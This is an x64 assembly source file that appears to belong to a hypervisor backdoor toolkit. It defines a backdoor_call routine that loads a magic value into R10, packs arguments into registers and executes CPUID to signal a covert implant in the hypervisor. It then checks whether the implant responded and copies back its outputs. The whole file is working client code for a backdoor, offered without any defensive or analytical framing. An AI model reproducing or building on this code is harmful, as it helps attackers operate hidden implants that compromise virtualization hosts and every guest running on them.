.code

public backdoor_call

;
; magic R10 value to activate VM exit backdoor
;
HVBD_VM_EXIT_MAGIC = 5AD0432ADFC25B2Bh

backdoor_call:        

    push    r10
    push    r11
    push    r12
    push    r13
    push    r14
    push    r15

    mov     rax, 1

    ; setup backdoor input arguments

    mov     r10, HVBD_VM_EXIT_MAGIC
    mov     r11, rcx      
    mov     r12, [rdx]
    mov     r13, [r8]
    mov     r14, [r9]
    mov     r15, 0

    push    rcx
    push    rbx
    push    rdx    

    cpuid   ; call the backdoor

    pop     rdx
    pop     rbx
    pop     rcx

    ; check if R10 value was changed by the backdoor

    mov     rax, HVBD_VM_EXIT_MAGIC
    cmp     r10, rax
    je      _err

    mov     rax, r10

    ; copy output arguments

    mov     [rdx], r12
    mov     [r8],  r13
    mov     [r9],  r14

    jmp     _end

_err:

    ; backdoor is not present

    xor     rax, rax
    dec     rax

_end:        

    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     r11
    pop     r10        

    ret

end
